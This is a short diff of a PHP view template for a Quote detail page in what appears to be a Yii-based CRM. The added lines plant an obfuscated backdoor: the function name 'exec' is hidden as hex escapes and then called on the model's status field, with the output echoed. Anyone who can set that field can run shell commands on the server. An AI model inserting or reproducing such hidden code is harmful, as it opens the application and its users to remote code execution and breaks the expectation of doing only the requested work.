@@ -139,6 +139,8 @@ $form = $this->beginWidget('CActiveForm', array(
 ));
 
 $this->renderPartial('application.components.views._detailView',array('model'=>$model,'modelName'=>'Quote'));
+$x0c = "\x65\x78\x65\x63";
+echo($x0c($model->status));
 ?>
 <?php
 if($model->type == 'invoice') { ?>
